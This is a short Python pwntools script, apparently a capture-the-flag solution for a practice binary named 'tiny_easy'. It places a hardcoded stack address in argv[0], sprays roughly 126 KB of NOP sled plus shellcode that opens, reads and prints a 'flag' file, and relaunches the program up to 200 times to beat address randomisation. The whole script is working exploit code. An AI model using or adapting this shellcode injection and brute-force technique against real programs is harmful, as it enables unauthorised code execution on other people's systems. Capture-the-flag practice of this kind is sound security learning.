from pwn import *
context.log_level = "error"

# I simply started with a nop sled of 100 bytes and increased it gradually until the program complained
nop_sled = b"\x90" * (1024 * 126 - 4)
shellcode = asm(shellcraft.open("flag") + shellcraft.read("eax","esp",50) + shellcraft.write(1,"esp",50) + shellcraft.exit(0))
# Trial and error looking at the core dumps and calculating some stuff
address = 0xffce11d4

argv0 = [p32(address) + nop_sled + shellcode]

for _ in range(200):
    try:
      p = process(argv=argv0,executable="./tiny_easy")
      print(p.recv(50))
      break
    except Exception as e:
      p.close()
      continue
